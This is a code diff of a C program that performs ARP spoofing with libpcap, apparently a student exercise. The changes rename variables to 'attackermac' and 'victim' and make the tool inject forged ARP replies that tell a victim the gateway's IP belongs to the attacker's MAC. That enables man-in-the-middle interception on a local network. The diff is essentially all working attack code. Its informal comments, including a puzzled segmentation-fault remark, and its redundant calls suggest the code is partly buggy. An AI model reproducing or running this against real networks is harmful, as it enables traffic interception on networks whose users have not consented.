@@ -46,11 +46,11 @@ void ip_change(char * ip, uint8_t * unchanged_ip){
     unchanged_ip[3] = (uint8_t)atoi(d);
 }
 
-void makeETH_request(struct ethernet_header *eth, uint8_t *mymac){
+void makeETH_request(struct ethernet_header *eth, uint8_t *attackermac){
     uint8_t eth_dmac_broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; //broadcast
     uint8_t eth_tmac[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00}; //because sender doesn't know target mac
     memcpy(eth->ether_dhost, eth_dmac_broadcast,  6); //sender dst_mac is 0xFF * 6
-    memcpy(eth_tmac, mymac, 6); //mymac is sendermac
+    memcpy(eth_tmac, attackermac, 6); //mymac is sendermac
     memcpy(eth->ether_shost, eth_tmac, sizeof(eth_tmac)); //targetmac is 0x00 * 6
     eth->ether_type = htons(0x0806); //ARP type == 0x0806
 }
@@ -72,7 +72,7 @@ int main(int argc, char* argv[])
     }//check input argv is right!
 
     char device[20];
-    uint8_t mymac[6];
+    uint8_t attackermac[6];
     u_char flush[42];
     char errbuf[1000];
 
@@ -84,11 +84,12 @@ int main(int argc, char* argv[])
     //make normal packet
     char *dev = argv[1];
     uint8_t ipstr[4];
-    uint8_t targetIP[4];
+    uint8_t receiverIP[4];
     uint8_t macstr[6];
     my_info_setting(dev, ipstr, macstr);
-    ip_change(argv[2], targetIP);
-
+    ip_change(argv[2], receiverIP);
+    uint8_t targetip[4];
+    ip_change(argv[3], targetip);
 
     //input ethernet header
     makeETH_request(&eth, macstr);
@@ -99,7 +100,7 @@ int main(int argc, char* argv[])
     memcpy(&flush[22], macstr, 6);
     memcpy(&flush[28], ipstr, 4);
     memcpy(&flush[32], "\x00\x00\x00\x00\x00\x00", 6);
-    mempcpy(&flush[38], targetIP, 4);
+    mempcpy(&flush[38], receiverIP, 4);
     //input arp_payload
     printf("ARP REPLY:\n");
     for(int i = 1; sizeof(flush) >= i; i++){
@@ -108,7 +109,7 @@ int main(int argc, char* argv[])
             printf("\n");
         }
     }
-    printf("\n");
+    ip_change(argv[3], targetip);
     while(true){
         pcap_t* handle = pcap_open_live(argv[1],1000,1,1000,errbuf);
         pcap_inject(handle, (u_char*)flush, sizeof(flush));
@@ -124,11 +125,10 @@ int main(int argc, char* argv[])
         }
         //if it is reply_packet, make reply_packet
         else {
-            arp_reply->ether_h.ether_shost; // this is mac_address attacker want to know!
+            arp_reply->ether_h.ether_shost; // this is mac_address(sender's mac) attacker want to know!
             printf("\n");
-            //now sender(attacker) will use gateway IP, and victim's mac(allocate to dst mac)
-            uint8_t gatewayip[4];
-            ip_change(argv[3], gatewayip);
+            //now attacker will use gateway IP(target IP), and sender's(victim) mac(allocate to dst mac)
+            //segmentation fault....??!!!!!!!!!!
             //now we make arp_reply_reply packet
             //arp_reply_reply_ethernet header
             memcpy(&flush[0], arp_reply->ether_h.ether_shost,6); //dst_mac is victim mac
@@ -138,7 +138,7 @@ int main(int argc, char* argv[])
             makeARP_header(&arh, ARPOP_REPLY);
             //arp_reply_reply arp_payload;
             memcpy(&flush[22], arp_reply->ether_h.ether_dhost, 6); //sender mac is sender mac(mymac)
-            memcpy(&flush[28], gatewayip, 4);//sender ip is gateway ip
+            memcpy(&flush[28], targetip, 4);//sender ip is gateway ip
             memcpy(&flush[32], arp_reply->ether_h.ether_shost, 6);//target mac is victim mac
             memcpy(&flush[38], arp_reply->arp_py.sender_ip, 4);//target ip is victim ip
             printf("ATTACK REPLY!!: \n");
@@ -150,7 +150,7 @@ int main(int argc, char* argv[])
             }
             printf("\n");
             pcap_t* handle = pcap_open_live(argv[1],1000,1,1000,errbuf);
-            pcap_inject(handle, (u_char*)packet, sizeof(packet));
+            pcap_inject(handle, (u_char*)flush, sizeof(flush));
         }
     }
 }
